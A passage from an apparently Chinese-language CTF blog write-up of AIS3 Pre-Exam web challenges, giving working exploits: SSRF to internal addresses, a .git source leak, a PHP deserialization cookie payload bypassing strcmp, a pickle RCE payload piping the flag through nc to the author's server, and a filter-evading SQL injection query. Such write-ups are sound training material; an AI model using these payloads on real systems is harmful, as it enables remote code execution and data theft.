LOCAL</span><br><span class="line">        |-- 172.22.255.255</span><br><span class="line">           &#x2F;32 link BROADCAST</span><br></pre></td></tr></table></figure>
+<p>看了下IP，就從127.22.0.0開始找，然後用<code>?path=http://172.22.0.1/flag</code>來讀，沒多久就在127.22.0.2找到Flag。</p>
+<p>Flag: <code>AIS3&#123;5h4rk5_d0n&#39;7_5w1m_b4ckw4rd5&#125;</code></p>
+<h3 id="🐘Elephant"><a href="#🐘Elephant" class="headerlink" title="🐘Elephant"></a>🐘Elephant</h3><p>網頁有個可以輸入name的地方，先隨便打一些東西之後登入，然後就在網頁內找到一個提示<code>You may want to read the source code.</code>，所以就先朝著找原碼為目標前進。</p>
+<p>試了一些方法，試到了<code>/.git/HEAD</code>的時候發現可以用GitHack來洩漏原碼。<br>進行洩漏得到了以下的程式碼:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">const</span> SESSION = <span class="string">&#x27;elephant_user&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = md5(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>] . rand());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp(<span class="variable">$flag</span>, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;logout&#x27;</span>])) &#123;</span><br><span class="line">    header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    setcookie(SESSION, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="variable">$name</span>);</span><br><span class="line">    header(<span class="string">&#x27;Location: /&#x27;</span>);</span><br><span class="line">    setcookie(SESSION, base64_encode(serialize(<span class="variable">$user</span>)), time() + <span class="number">600</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$data</span> = @<span class="variable">$_COOKIE</span>[SESSION]) &#123;</span><br><span class="line">    <span class="variable">$user</span> = unserialize(base64_decode(<span class="variable">$data</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以發現有個User類別，而輸入的Name會被儲存在裡面，然後如果token跟Flag一樣的話就會印出Flag，然後這個User會被serialize後存在Cookie內，如果Cookie裏頭已經有內容的話則會拿出來Unserialze，所以User內的資料是可以被控制的!</p>
+<p>觀察一下後在strcmp發現了弱比較的露洞。<br>如果放進去的是兩個String，那回傳值只有<code>&gt;0, &lt;0, ==0</code>，可是放入其他不是String的東西的時候會回傳<code>NULL</code>。<br>而<code>strcmp($flag, $this-&gt;token) == 0</code>用弱比較來檢查，所以<code>NULL</code>會被視為<code>0</code>，那這個驗證就可以被繞過啦。</p>
+<p>我寫了一段php來產出最終的payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token = <span class="keyword">array</span>(<span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">canReadFlag</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> strcmp(<span class="variable">$flag</span>, <span class="keyword">$this</span>-&gt;token) == <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> User(<span class="string">&#x27;TwinkleStar03&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span>(base64_encode(serialize(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&gt; Tzo0OiJVc2VyIjoyOntzOjQ6Im5hbWUiO3M6MTM6IlR3aW5rbGVTdGFyMDMiO3M6MTE6IgBVc2VyAHRva2VuIjthOjI6e2k6MDtzOjE6IkEiO2k6MTtzOjE6IkIiO319</span><br></pre></td></tr></table></figure>
+<p>最後把這段b64放到Cookie上，然後重整頁面Flag就出來了!</p>
+<p>Flag: <code>AIS3&#123;0nly_3l3ph4n75_5h0uld_0wn_1v0ry&#125;</code></p>
+<h3 id="🐍Snake"><a href="#🐍Snake" class="headerlink" title="🐍Snake"></a>🐍Snake</h3><p>這題一進到網頁就給出了Code</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> pickle, base64, traceback</span><br><span class="line"></span><br><span class="line">Response.default_mimetype = <span class="string">&#x27;text/plain&#x27;</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    data = request.values.get(<span class="string">&#x27;data&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> data <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = base64.b64decode(data)</span><br><span class="line">            data = pickle.loads(data)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> data <span class="keyword">and</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">open</span>(<span class="string">&#x27;/flag&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">str</span>(data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> traceback.format_exc()</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br></pre></td></tr></table></figure>
+<p>是一題Python序列化的題目，看到題目的當下我想到之前有看過可以濫用<code>pickle.loads</code>去達到RCE的文章，所以就先朝著這個目標前進。</p>
+<p>原本想要試試看能不能讓他彈一個ReverseShell回來，不過不知道為什麼都不成功，所以最後只讓他可以印出Flag。</p>
+<p>最後採用把flag cat出來之後回傳給自己的伺服器。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BadObj</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">import</span> os</span><br><span class="line">        <span class="keyword">return</span> os.system, (<span class="string">&#x27;cat /flag | nc &lt;My Server&gt; 5555;&#x27;</span>,)</span><br></pre></td></tr></table></figure>
+<p>Flag: <code>AIS3&#123;7h3_5n4k3_w1ll_4lw4y5_b173_b4ck&#125;</code></p>
+<h3 id="🦉Owl"><a href="#🦉Owl" class="headerlink" title="🦉Owl"></a>🦉Owl</h3><p>網頁就是個帳號密碼的登入介面，然而有個提示說: <code>UESS THE STUPID USERNAME / PASSWORD</code>，所以就先試試看常見的弱帳密來登入，發現可以用<code>admin/admin</code>來登入。</p>
+<p>原本以為登入之後沒有東西了，結果上面有個Show hint的按鈕藏在上端。</p>
+<p>Hint就是網頁的原碼:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;source&#x27;</span>])) &#123;</span><br><span class="line">        highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Settings</span></span><br><span class="line">    ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    ini_set(<span class="string">&#x27;display_startup_errors&#x27;</span>, <span class="number">1</span>);</span><br><span class="line">    error_reporting(E_ALL);</span><br><span class="line">    date_default_timezone_set(<span class="string">&#x27;Asia/Taipei&#x27;</span>);</span><br><span class="line">    session_start();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// CSRF</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]))</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>] = md5(rand() * rand());</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;csrf.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$csrf</span> = <span class="keyword">new</span> Csrf(<span class="variable">$_SESSION</span>[<span class="string">&#x27;csrf_key&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$action</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>]) &#123;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">redirect</span>(<span class="params"><span class="variable">$path</span> = <span class="string">&#x27;/&#x27;</span>, <span class="variable">$message</span> = <span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$alert</span> = <span class="variable">$message</span> ? <span class="string">&#x27;alert(&#x27;</span> . json_encode(<span class="variable">$message</span>) . <span class="string">&#x27;)&#x27;</span> : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="variable">$path</span> = json_encode(<span class="variable">$path</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;<span class="subst">$alert</span>; document.location.replace(<span class="subst">$path</span>);&lt;/script&gt;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;logout&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable">$action</span> === <span class="string">&#x27;login&#x27;</span>) &#123;</span><br><span class="line">            <span class="comment">// Validate CSRF token</span></span><br><span class="line">            <span class="variable">$token</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;csrf_token&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$token</span> || !<span class="variable">$csrf</span>-&gt;validate(<span class="variable">$token</span>)) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;invalid csrf_token&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Check if username and password are given</span></span><br><span class="line">            <span class="variable">$username</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            <span class="variable">$password</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$username</span> || !<span class="variable">$password</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;username and password should not be empty&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of sqlmap kiddies</span></span><br><span class="line">            <span class="keyword">if</span> (stripos(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>], <span class="string">&#x27;sqlmap&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;sqlmap is child&#x27;s play&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Get rid of you</span></span><br><span class="line">            <span class="variable">$bad</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;/*&#x27;</span>, <span class="string">&#x27;*/&#x27;</span>, <span class="string">&#x27;select&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;and&#x27;</span>, <span class="string">&#x27;where&#x27;</span>, <span class="string">&#x27;from&#x27;</span>, <span class="string">&#x27;--&#x27;</span>];</span><br><span class="line">            <span class="variable">$username</span> = str_ireplace(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$username</span> = str_ireplace(<span class="variable">$bad</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Auth</span></span><br><span class="line">            <span class="variable">$hash</span> = md5(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$row</span> = (<span class="keyword">new</span> SQLite3(<span class="string">&#x27;/db.sqlite3&#x27;</span>))</span><br><span class="line">                -&gt;querySingle(<span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27; AND password = &#x27;<span class="subst">$hash</span>&#x27;&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$row</span>) &#123;</span><br><span class="line">                redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;login failed&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            redirect(<span class="string">&#x27;/&#x27;</span>, <span class="string">&quot;unknown action: <span class="subst">$action</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$user</span> = @<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>];</span><br></pre></td></tr></table></figure>
+<p>看起來是個SQLi的題目，但是前面過濾了一些會用到的關鍵字，還過濾兩次，但其實是可以被繞過的!<br>比方說<code>union</code>，如果我把關鍵字做成<code>unoorrion</code>，第一次過濾後會變成<code>unorion</code>再經過一次之後會變成<code>union</code>就變成合法的關鍵字了! 每個關鍵字都可以透過這種方法來繞過! </p>
+<p>但空白也會被過濾掉，但是其實可以透過<code>/</code>來代替空白，代替完的Query還是合法的!</p>
+<p>最終Query: <code>&#39;/oorr**oorr/unoorrion/oorr**oorr/all/oorr**oorr/selecoorrt/oorr**oorr/1,group_concat(value),2/oorr**oorr/frfrfromomom/oorr**oorr/garbage/oorr*</code></p>
+<p>Flag: <code>AIS3&#123;4_ch1ld_15_4_curly_d1mpl3d_lun471c&#125;</code></p>
+
+    </div>
+
+    
+    
+    
+        
+
+  <div class="followme">
+    <p>歡迎關注我的其它發布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Writeup/" rel="tag"># Writeup</a>
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/AIS3-Pre-Exam/" rel="tag"># AIS3 Pre-Exam</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/Contest/CTF/MooncakeCTF/" rel="prev" title="PHP字元的神奇運用">
+      <i class="fa fa-chevron-left"></i> PHP字元的神奇運用
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目錄
+        </li>
+        <li class="sidebar-nav-overview">
+          本站概要
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%90%A7Misc"><span class="nav-number">1.</span> <span class="nav-text">🐧Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%92%A4Piquero"><span class="nav-number">1.1.</span> <span class="nav-text">💤Piquero</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%90%A5Karuego"><span class="nav-number">1.2.</span> <span class="nav-text">🐥Karuego</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%8C%B1Soy"><span class="nav-number">1.3.</span> <span class="nav-text">🌱Soy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%91%91Saburo"><span class="nav-number">1.4.</span> <span class="nav-text">👑Saburo</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%99%BB%EF%B8%8FReverse"><span class="nav-number">2.</span> <span class="nav-text">♻️Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%8D%8DTsaiBro"><span class="nav-number">2.1.</span> <span class="nav-text">🍍TsaiBro</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%8E%B9Fallen-Beat"><span class="nav-number">2.2.</span> <span class="nav-text">🎹Fallen Beat</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%92%A5-Pwn"><span class="nav-number">3.</span> <span class="nav-text">💥 Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%91%BB-BOF"><span class="nav-number">3.1.</span> <span class="nav-text">👻 BOF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%99%8A-Crypto"><span class="nav-number">4.</span> <span class="nav-text">🙊 Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%A6%95-Brontosaurus"><span class="nav-number">4.1.</span> <span class="nav-text">🦕 Brontosaurus</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%A6%96-T-Rex"><span class="nav-number">4.2.</span> <span class="nav-text">🦖 T-Rex</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%F0%9F%8C%90Web"><span class="nav-number">5.</span> <span class="nav-text">🌐Web</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%90%BF%EF%B8%8FSquirrel"><span class="nav-number">5.1.</span> <span class="nav-text">🐿️Squirrel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%A6%88Shark"><span class="nav-number">5.2.</span> <span class="nav-text">🦈Shark</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%90%98Elephant"><span class="nav-number">5.3.</span> <span class="nav-text">🐘Elephant</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%90%8DSnake"><span class="nav-number">5.4.</span> <span class="nav-text">🐍Snake</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%F0%9F%A6%89Owl"><span class="nav-number">5.5.</span> <span class="nav-text">🦉Owl</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="TwinkleStar03"
+      src="/images/avatar_sena.png">
+  <p class="site-author-name" itemprop="name">TwinkleStar03</p>
+  <div class="site-description" itemprop="description">日常的學習紀錄d(`･∀･)b<br><br>Pwning my world٩(ŏ﹏ŏ、)۶<br>New CTFer.</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">12</span>
+          <span class="site-state-item-name">文章</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分類</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">26</span>
+        <span class="site-state-item-name">標籤</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:star@twinklestar03.com" title="E-mail → mailto:star@twinklestar03.com"><i class="fa fa-envelope fa-fw"></i>E-mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">TwinkleStar03</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
